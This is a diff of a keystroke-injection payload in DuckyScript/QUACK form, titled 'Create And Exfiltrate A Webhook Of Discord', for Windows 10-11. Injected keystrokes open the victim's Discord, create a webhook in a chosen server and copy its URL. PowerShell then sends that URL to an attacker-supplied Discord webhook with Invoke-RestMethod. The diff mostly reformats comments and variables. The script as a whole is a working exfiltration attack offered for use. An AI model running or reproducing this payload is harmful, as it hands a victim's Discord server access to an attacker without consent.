@@ -1,38 +1,43 @@
-* ###############################################################
-* #                                                             |
-* # Title        : Create And Exfiltrate A Webhook Of Discord   |
-* # Author       : Aleff                                        |
-* # Version      : 1.0                                          |
-* # Category     : Exfiltration                                 |
-* # Target       : Windows 10-11                                |
-* #                                                             |
-* ###############################################################
+###############################################################
+#                                                             |
+# Title        : Create And Exfiltrate A Webhook Of Discord   |
+# Author       : Aleff                                        |
+# Version      : 1.0                                          |
+# Category     : Exfiltration                                 |
+# Target       : Windows 10-11                                |
+#                                                             |
+###############################################################
 
+ATTACKMODE HID
 
-* Requirements:
-*     - Internet connection
-*     - Discord Installed
+# REQUIREMENTS
+# - Internet connection
+# - Discord Installed
 
+# VARIABLES
+# 1) You must define the Discord server name i.e. Hak5
+SERVER_NAME='example'
+# 2) You must define your Discord webhook if you want to use this method for the exfiltration
+DISCORD_WEBHOOK='example'
 
-* Open Discord app
+# Open Discord app
+QUACK DELAY 1500
 QUACK GUI
 QUACK DELAY 1000
 QUACK STRING Discord
 QUACK ENTER
 
-* It depends
+# It depends
 QUACK DELAY 6000
 
-* Search by Discord keyboard shortcut and open it
+# Search by Discord keyboard shortcut and open it
 QUACK CTRL k
 QUACK DELAY 500
-
-* You must define the Discord server name i.e. Hak5
-QUACK STRING *SERVER_NAME
+QUACK STRING *$SERVER_NAME
 QUACK ENTER
 QUACK DELAY 500
 
-* Go to first channel and open the settings
+# Go to first channel and open the settings
 QUACK TAB
 QUACK DELAY 500
 QUACK TAB
@@ -58,7 +63,7 @@ QUACK DELAY 500
 QUACK ENTER
 QUACK DELAY 500
 
-* Open Integrations section
+# Open Integrations section
 QUACK TAB
 QUACK DELAY 500
 QUACK TAB
@@ -80,14 +85,14 @@ QUACK DELAY 500
 QUACK ENTER
 QUACK DELAY 500
 
-* Webhooks settings
+# Webhooks settings
 QUACK TAB
 QUACK DELAY 500
 QUACK TAB
 QUACK DELAY 500
 QUACK ENTER
 
-* Create Webhook
+# Create Webhook
 QUACK TAB
 QUACK DELAY 500
 QUACK TAB
@@ -97,13 +102,13 @@ QUACK DELAY 500
 QUACK ENTER
 QUACK DELAY 500
 
-* Select first Webhook
+# Select first Webhook
 QUACK TAB
 QUACK DELAY 500
 QUACK ENTER
 QUACK DELAY 500
 
-* Copy Webhook
+# Copy Webhook
 QUACK TAB
 QUACK DELAY 500
 QUACK TAB
@@ -117,10 +122,10 @@ QUACK DELAY 500
 QUACK SPACE
 QUACK DELAY 500
 
-* Close Discord
+# Close Discord
 QUACK ALT F4
 
-* Open a PowerShell
+# Open a PowerShell
 QUACK DELAY 500
 QUACK GUI r
 QUACK DELAY 500
@@ -128,15 +133,13 @@ QUACK STRING powershell
 QUACK DELAY 500
 QUACK ENTER
 QUACK DELAY 2000
-
-* You must define your Discord webhook if you want to use this method for the exfiltration
-QUACK STRING $WebhookUrl = "#DISCORD_WEBHOOK"
+QUACK STRING $WebhookUrl = '$DISCORD_WEBHOOK'
 QUACK ENTER
-
-QUACK STRING $Payload = @{content = "
+QUACK DELAY 500
+QUACK STRING $Payload = @{content = '
 QUACK CTRL v
-QUACK STRING "} | ConvertTo-Json
+QUACK STRING '} | ConvertTo-Json
 QUACK ENTER
-
+QUACK DELAY 500
 QUACK STRING Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $Payload -ContentType 'application/json'; exit;
 QUACK ENTER
